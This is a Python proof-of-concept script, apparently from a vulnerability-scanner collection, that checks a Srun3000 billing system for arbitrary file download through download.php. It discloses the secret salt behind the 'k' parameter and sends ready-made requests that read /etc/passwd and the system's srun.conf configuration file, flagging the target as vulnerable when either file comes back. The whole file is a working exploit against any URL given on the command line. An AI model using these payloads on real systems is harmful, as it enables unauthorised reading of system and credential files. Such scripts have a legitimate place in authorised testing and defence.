#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 深澜软件srun3000计费系统download.php任意文件下载
referer: http://www.wooyun.org/bugs/WooYun-2014-55303
author: Lucifer
description: srun3000 8081端口文件download.php中,k为md5(file+"ijfri&8%4")导致任意文件下载。
'''
import sys
import requests
import warnings
from termcolor import cprint

class srun_download_file_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/download.php?k=f8e86819411e743ed8b762a259bf163f&file=/srun3/etc/srun.conf"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"hostname" in req.text and r"clientver" in req.text:
                cprint("[+]存在深澜软件srun3000计费系统download.php任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
            vulnurl = self.url + "/download.php?k=5a965488ed38055590daf62ddd52dbb3&file=/etc/passwd"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"root:" in req.text and r"/bin/bash" in req.text:
                cprint("[+]存在深澜软件srun3000计费系统download.php任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = srun_download_file_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()